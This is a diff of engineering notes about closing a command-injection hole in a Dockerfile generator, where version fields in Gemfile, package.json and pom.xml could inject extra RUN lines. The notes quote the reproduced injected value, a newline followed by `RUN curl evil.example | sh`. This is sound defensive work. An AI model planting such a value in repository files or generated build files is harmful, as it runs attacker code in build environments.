@@ -42,10 +42,21 @@ in Cargo.toml, `ruby '...'` in a Gemfile), and a JS negated character class matc
 generated Dockerfile. REPRODUCED pre-guard: the Gemfile regex returns
 `3.4\nRUN curl evil.example | sh`, which rendered as a standalone RUN line. `isPlainVersion`
 now gates both (Go was already safe: normalizeGoVersion rebuilds the string from numeric
-parts). NOT fixed, because it is pre-existing and outside this plan: `versions.node`
-(package.json `engines.node`) and `versions.java` (pom.xml `<maven.compiler.source>`) reach
-their install lines the same way and are injectable identically. `versions.php` is safe —
-normalizePhpVersion strips everything but digits and dots.
+parts).
+
+`versions.node` (package.json `engines.node`) and `versions.java` (pom.xml
+`<maven.compiler.source>`) were injectable identically and PRE-DATE this change; closed in
+the same sweep on request. Both name their install source by MAJOR alone
+(`setup_${n}.x`, `openjdk-${n}-jdk-headless`), so `isPlainMajor` gates the derived part and
+falls back to the recorded default. REPRODUCED pre-guard: the pom capture `([^<]+)` returns
+`17\nRUN curl evil.example | sh`, and the node line rendered as
+`curl -fsSL https://deb.nodesource.com/setup_22` followed by a standalone
+`RUN curl evil.example | sh`. The Java `1.8 -> 8` unwrap is preserved and tested.
+
+`versions.php` was already safe — normalizePhpVersion strips everything but digits and dots.
+Not touched, and NOT the same class: `extraPackages`, the LSP pins and the chrome-devtools
+version are user-typed or admin-set rather than repo-derived, so they are the operator's own
+sandbox, not a hostile clone.
 
 `declaredDeps.versions` gains go/rust/ruby CONDITIONALLY, like `browser` and for the same
 reason — the object is folded into `envTemplateHash`, so three always-present nulls would
